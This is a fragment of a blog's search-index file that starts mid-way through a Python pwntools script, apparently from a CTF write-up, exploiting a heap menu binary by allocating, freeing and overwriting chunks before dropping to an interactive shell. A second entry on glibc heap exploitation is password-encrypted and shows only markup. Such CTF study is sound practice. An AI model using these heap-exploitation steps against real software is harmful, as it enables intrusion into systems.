class="params">size, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">gift()</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x3fa4</span>))</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p64(<span class="number">0x2da</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>高版本glibc堆利用笔记</title>
      <link href="/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c2e10090e128f7e3054c3a40d1280866bf405cf529b60eab97791c3036808b28"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
